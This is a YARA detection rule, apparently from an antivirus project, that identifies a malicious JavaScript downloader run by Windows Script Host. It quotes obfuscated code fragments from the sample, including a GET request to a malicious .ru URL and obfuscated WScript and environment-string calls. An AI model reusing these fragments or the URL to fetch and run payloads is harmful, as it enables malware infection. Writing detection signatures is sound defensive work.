rule sig_20160428_49fdb63126d213e3a52f37b4f0c6c006 {
  meta:
    description = "datamaliciousorder - file 20160428_49fdb63126d213e3a52f37b4f0c6c006.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "055fdd209f0e95be4936604428a16e21195af06b1c324c1254fa0eda7944d04c"

  strings:
    $s1  = "function IizPvxHiqXphNreHasEre() {return LdzHqjPfsLkeDmhGwiVwz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function SguSvwPzhBelAdhLwsHhy(JpjGzcGnrEnoJdiRbeHxb){LdzHqjPfsLkeDmhGwiVwz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function SguSvwPzhBelAdhLwsHhy(JpjGzcGnrEnoJdiRbeHxb){LdzHqjPfsLkeDmhGwiVwz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KcwHxnPxrQepOraYnkBaf(WknClgOpfBeiFmmCcdBbw, McmMpvFxqPriWlsXsuCme){JvfHxbNayBlkJegTabNju = JvfHxbNayBlkJegTabNju * 1; " ascii
    $s5  = "var LdzHqjPfsLkeDmhGwiVwz = function RrgJtaBiySrnFlzFmyFky() {return JvhXkvNhxQedMohYgePvw[FowMcjLcrGxvWfaBetSuq](\"WScript\"+\"" ascii
    $s6  = "return WknClgOpfBeiFmmCcdBbw - McmMpvFxqPriWlsXsuCme;};" fullword ascii
    $s7  = "YoxBqqMtvGqrCdqQyaFxb[CxeFozVowIstGgzEddXso](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s8  = "var LdzHqjPfsLkeDmhGwiVwz = function RrgJtaBiySrnFlzFmyFky() {return JvhXkvNhxQedMohYgePvw[FowMcjLcrGxvWfaBetSuq](\"WScript\"+\"" ascii
    $s9  = "var JvhXkvNhxQedMohYgePvw = this[\"WScript\"];" fullword ascii
    $s10 = "function IizPvxHiqXphNreHasEre() {return LdzHqjPfsLkeDmhGwiVwz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function KcwHxnPxrQepOraYnkBaf(WknClgOpfBeiFmmCcdBbw, McmMpvFxqPriWlsXsuCme){JvfHxbNayBlkJegTabNju = JvfHxbNayBlkJegTabNju * 1; " ascii
    $s12 = "if (YoxBqqMtvGqrCdqQyaFxb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function LonZujWbkKxjTdbOwfDpn(){return FoqQvwEtfMtaTjhMxkSuu + \"\";};" fullword ascii
    $s14 = "function ErtVgoLxxPlzVxbSeoXze() {return ((JhaLrtPmvEufLqcEatKlq == true) && (JhaLrtPmvEufLqcEatKlq == TsmXcfKjhLtbZnhNoeBxm)) ?" ascii
    $s15 = "function ErtVgoLxxPlzVxbSeoXze() {return ((JhaLrtPmvEufLqcEatKlq == true) && (JhaLrtPmvEufLqcEatKlq == TsmXcfKjhLtbZnhNoeBxm)) ?" ascii
    $s16 = "function LpsWzqTuvIhgKjwQkuVhy(){return 23;};" fullword ascii
    $s17 = "function BlcGocQzkRndKwnBafFey(){return FowMcjLcrGxvWfaBetSuq;};" fullword ascii
    $s18 = "TsmXcfKjhLtbZnhNoeBxm = true; " fullword ascii
    $s19 = "var TsmXcfKjhLtbZnhNoeBxm = false;" fullword ascii
    $s20 = "var RrnXybIhwIjkUctLacVer = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}